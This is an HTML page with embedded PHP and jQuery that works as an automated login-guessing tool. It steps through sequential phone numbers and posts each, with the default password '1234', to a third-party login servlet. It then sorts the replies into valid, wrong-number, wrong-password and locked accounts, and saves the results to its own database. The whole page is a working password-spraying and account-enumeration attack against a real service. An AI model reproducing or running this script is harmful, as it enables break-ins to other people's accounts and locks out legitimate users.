<html><body><script src="http://code.jquery.com/jquery-1.9.1.js"></script><button id="fetch">Fetch</button><style>    #valid, #invalid_pass, #invalid_phone, #blocked{        width: 200px;        float: left;        height: 500px;        overflow-x: auto;        font-size: 12px;    }    #valid{        color: green;        font-weight: bold;    }    #invalid_phone, #invalid_pass{        color: red;    }    #blocked{        color: #555555;    }</style><div id="valid">    <h3 style="color: black;">Valid</h3></div><div id="invalid_phone">    <h3 style="color: black">Invalid Phone</h3></div><div id="invalid_pass">    <h3 style="color: black">Invalid Password</h3></div><div id="blocked">    <h3 style="color: black">Blocked</h3></div><script>    function save_in_db(number, status, soldier_id)    {        $.get("<?=base_url()."admin/save/"?>"+number+"/"+status+"/"+soldier_id, function(data,status){        });    }        function fetch(phone_number, LIMIT)        {            var PHONE_NUMBER = phone_number+1;            var posting = $.post("https://wp.vbxportal.com/Norlight/LoginServlet",                {                    LOGIN_PHONE_NUMBER: PHONE_NUMBER,                    LOGIN_PHONE_PASSWORD: "1234",                    LOGIN_REMEMBER_ME: "LOGIN_REMEMBER_ME",                    LOGIN_FUNCTION: "LOGIN"                }            );            /* Alerts the results */            posting.done(function( data ) {                var str = data;                //document.getElementById("valid").innerHTML += "<br>" + data;                var n1 = str.search("Invalid Phone Number");                var n2 = str.search("Invalid Password");                var n3 = str.search("Account locked");                var status = 1;                if(n1 != -1){                    document.getElementById("invalid_phone").innerHTML += "<br>" + PHONE_NUMBER;                    status = 2;                }else if(n2 != -1){                    document.getElementById("invalid_pass").innerHTML += "<br>" + PHONE_NUMBER;                    status = 3;                }else if(n3 != -1){                    document.getElementById("blocked").innerHTML += "<br>" + PHONE_NUMBER;                    status = 4;                }else{                    document.getElementById("valid").innerHTML += "<br>" + PHONE_NUMBER;                    status = 1;                }                save_in_db((PHONE_NUMBER - <?= $code ?>), status, <?= $soldier_id ?>);                if(PHONE_NUMBER >= LIMIT){                    return;                }else{                    fetch(PHONE_NUMBER, <?= $code+$limit ?>);                }            });        }    $( "#fetch" ).click(function() {        fetch(<?= $code+$start ?>);    });</script></body></html>